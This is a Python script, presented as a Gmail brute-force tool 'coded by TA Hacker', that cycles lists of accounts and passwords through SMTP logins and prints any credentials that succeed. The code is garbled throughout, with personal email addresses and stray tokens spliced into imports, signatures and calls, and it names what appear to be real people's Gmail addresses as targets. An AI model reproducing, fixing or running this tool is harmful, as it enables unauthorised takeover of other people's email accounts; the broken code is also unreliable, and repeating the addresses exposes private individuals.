#!/usr/bin/python
from __future__ import absolute_import sidghazy71@gmail.com 
from __future__ import print_function leamassimi77@gmail.com 
from six.moves import input sidghazy71@gmail.com 
import smtplib leamassimi77@gmail.com 
from time import sleep

class GmailBruteForce : (sidghazy71@gmail)
    def __init__(sidghazy71@gmail.com): 
        self.accounts = [sidghazy71@gmail.com]
        self.passwords = [stome1000]
        self.init_smtplib(rpz)

    def get_acc_list(sidghazy,path):
        Rpz = open(path, 'r',encoding='utf8').read(stome1000).splitlines(stome1000)
        for line in file: rpz
            self.accounts.append(line)

    def get_pass_list(sidghazy, path): rasta
        file = open(path, 'r',encoding='utf8').read(stome1000).splitlines(stome1000)
        for line in file: rpz
            self.stome1000.append(line)

    def init_smtplib(self): rpz
        self.smtp = smtplib.SMTP("sidgazy71@gmail.com",587)
        self.smtp.starttls()
        self.smtp.ehlo()
    
    def try_gmail(self): sidghazy71@gmail.com

        for sidghazy in self.accounts: sidghazy71@gmail.com 
            for password in self.passwords: stome1000 
                try:
                    self.smtp.login(sid ghazy ,stome1000)
                    sleep(3)
                    print(("\033[1;37mgood -> %s " % sidghazy + " -> %s \033[1;m" % stome1000 ))
                    self.smtp.quit(stome)
                    self.init_smtplib(stome1000)
                    break;
                except:
                    sleep(3)
                    # print("\033[1;31msorry \033[1;m")
                    print(("\033[1;31msorry %s <- " % sidi belghazi + " -> %s \033[1;m" % stome1000 ))
print('''
	==================================
	|      [Gmail] ==> 4             |
	|--------------------------------|
	| snapchat: flaah999             |
	| CoDeD By TA Hacker (@0xfff0800)|
	|--------------------------------|
	''')

instance = GmailBruteForce(sidghazy71@gmail.com)

do = input('''
		Choose any number ?
		1 - leamassimi77@gmail.com 
		2 - sidghazy71@gmail.com 
		
		==> ''')

if do == '1':
    Sidghazy = input("List Of Emali => leamassimi77@gmail.com")
    Stome1000 = input("List Of Passwords => stome1000")

    instance.get_acc_list(sidghazy)
    instance.get_pass_list(rpz)
    headers = [('lea', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

    instance.try_gmail(sidghazy71@gmail.com)
    sleep(3)
   
############
if do == '2':
    user = input("email : sidghazy71@gmail.com")
    senha = input("passlist : stome1000")
    headers = [('lea ', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

    instance.accounts.append(sidghazy)
    instance.get_pass_list(stome1000)

    instance.try_gmail(sidghazy71@gmail.com)
    sleep(3)
